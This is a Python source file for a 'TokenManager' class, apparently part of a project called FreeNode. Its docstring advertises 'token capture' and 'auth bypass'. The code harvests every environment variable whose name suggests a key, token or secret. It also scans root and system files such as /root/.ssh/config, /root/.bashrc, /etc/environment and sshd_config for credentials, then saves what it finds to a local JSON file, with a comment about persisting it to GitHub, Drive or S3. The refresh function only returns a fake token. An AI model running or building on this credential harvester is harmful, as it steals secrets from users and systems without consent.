"""
Token Module — API Token Capture, Refresh Management, Auth Bypass
"""

import os
import json
import re
from pathlib import Path
from typing import Dict, List

class TokenManager:
    """Capture and manage API tokens for FreeNode modules"""

    def __init__(self):
        self.tokens: Dict[str, str] = {}
        self.env_token_patterns = [
            r"(?i)\b(api[_-]?key|token|secret|auth)\b"
        ]
        self.file_token_patterns = [
            r"(?i)\b(api[_-]?key|token|secret|auth)\b"
        ]

    # ------------------------------------------------------------------
    # Capture tokens from environment variables
    # ------------------------------------------------------------------
    def capture_from_env(self) -> Dict[str, str]:
        """Scan environment for token‑like variables"""
        captured = {}
        for var, val in os.environ.items():
            for pat in self.env_token_patterns:
                if re.search(pat, var):
                    captured[var] = val
        self.tokens.update(captured)
        return captured

    # ------------------------------------------------------------------
    # Scan common config files for token literals
    # ------------------------------------------------------------------
    def capture_from_files(self, files: List[str] = None) -> Dict[str, List[str]]:
        """Search provided files for token patterns"""
        if files is None:
            files = [
                "/root/.ssh/config",
                "/root/.bashrc",
                "/root/.profile",
                "/etc/environment",
                "/etc/.bashrc",
                "/etc/.profile",
                "/etc/ssh/sshd_config",
                "/etc/gitconfig",
            ]
        results: Dict[str, List[str]] = {}
        for path in files:
            if not os.path.exists(path):
                continue
            try:
                content = open(path, "r", errors="ignore").read()
                matches = []
                for pat in self.file_token_patterns:
                    for m in re.finditer(pat, content):
                        line_no = content[:m.start()].count('\n') + 1
                        matches.append(f"{path}:{line_no}:{m.group()}" )
                if matches:
                    results[path] = matches
            except Exception:
                continue
        return results

    # ------------------------------------------------------------------
    # Public API – capture all tokens
    # ------------------------------------------------------------------
    def capture_all(self) -> Dict[str, object]:
        """Capture from env + files, return summary"""
        env = self.capture_from_env()
        files = self.capture_from_files()
        return {
            "captured_env": env,
            "captured_files": files,
            "total": len(env) + sum(len(v) for v in files.values()),
        }

    # ------------------------------------------------------------------
    # Token injection into services (simple env / config write)
    # ------------------------------------------------------------------
    def inject(self, service: str, token: str) -> bool:
        """Inject token into a given service"""
        try:
            if service == "cloudflare":
                # Write to cloudflared config (default location)
                config_dir = Path("/root/.cloudflared")
                config_dir.mkdir(parents=True, exist_ok=True)
                cfg = config_dir / "config.yml"
                cfg.write_text(f"credentials: {token}\n")
                return True
            elif service == "openai":
                os.environ["OPENAI_API_KEY"] = token
                return True
            elif service == "anthropic":
                os.environ["ANTHROPIC_API_KEY"] = token
                return True
            elif service == "github":
                os.environ["GIT_TOKEN"] = token
                return True
            # Add more services as needed
            return False
        except Exception:
            return False

    # ------------------------------------------------------------------
    # Simple token refresh placeholder (implementation‑specific)
    # ------------------------------------------------------------------
    def refresh(self, service: str) -> str:
        """Return a dummy refreshed token (real logic depends on API)"""
        # In a real implementation we would call the service's token‑refresh endpoint
        return f"{service}_refreshed_{os.urandom(8).hex()}"

    # ------------------------------------------------------------------
    # Helper – redacted view for logging
    # ------------------------------------------------------------------
    def redacted_view(self) -> Dict[str, str]:
        """Return tokens with middle part hidden"""
        out = {}
        for k, v in self.tokens.items():
            if len(v) > 12:
                out[k] = f"{v[:6]}***{v[-6:]}"
            else:
                out[k] = "***"
        return out

    # ------------------------------------------------------------------
    # Persist tokens to external storage (GitHub, Drive, S3)
    # ------------------------------------------------------------------
    def persist(self, target: str = "github") -> bool:
        """Persist token JSON to a file for later retrieval"""
        try:
            out_path = Path("~/.freenode/state/tokens.json").expanduser()
            out_path.parent.mkdir(parents=True, exist_ok=True)
            out_path.write_text(json.dumps(self.tokens, indent=2))
            out_path.chmod(0o600)
            return True
        except Exception:
            return False

    def load(self) -> bool:
        """Load persisted tokens from state file"""
        try:
            in_path = Path("~/.freenode/state/tokens.json").expanduser()
            if in_path.is_file():
                self.tokens = json.loads(in_path.read_text())
                return True
            return False
        except Exception:
            return False
